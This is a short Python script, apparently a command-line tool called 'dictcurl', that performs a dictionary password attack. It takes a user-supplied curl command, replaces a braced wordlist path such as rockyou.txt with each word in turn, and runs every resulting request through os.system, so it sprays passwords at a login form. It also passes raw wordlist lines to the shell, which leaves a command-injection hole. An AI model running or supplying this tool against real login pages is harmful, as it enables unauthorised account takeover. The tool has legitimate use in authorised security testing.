import subprocess
import sys
import os
import threading

"""
This script only uses sniper attack for now.
"""
def printUsage():
    print('''
        Please add your curl code 

        Example: 
                $python3 dictcurl 'curl --data "email=test@test.com" --data "password={/usr/share/wordlists/rockyou.txt}" http://www.example.com  '
        
        ''')



def optInputs():

    if len(sys.argv)<=1:
        printUsage()
    elif sys.argv[1].find("{")+sys.argv[1].find("}")<0:
        printUsage()
    else:
        optChecker(sys.argv[1])


def optChecker(args):
    fileDirection = args.split("{")[1].split("}")[0]
    print(fileDirection)
    wordlist = list()
    try:
        with open(fileDirection,"r",encoding="ISO-8859-1") as f:
            wordlist = f.readlines()
    except:
        print("File is not valid or not exists")
        print("File = "+fileDirection)

    packageSender(wordlist,args)

def packageSender(wordlist,argv):
    firstPart = argv.split("{")[0]
    secondpart = argv.split("}")[1]
    print(firstPart+wordlist[0].split("\n")[0]+secondpart)
    i = 0
    while i<len(wordlist):
        code = firstPart+wordlist[i].split("\n")[0]+secondpart
        print(code)
        os.system(code)
        print()
        i+=1
        
def main():
    optInputs()



if __name__ == "__main__":
    main()
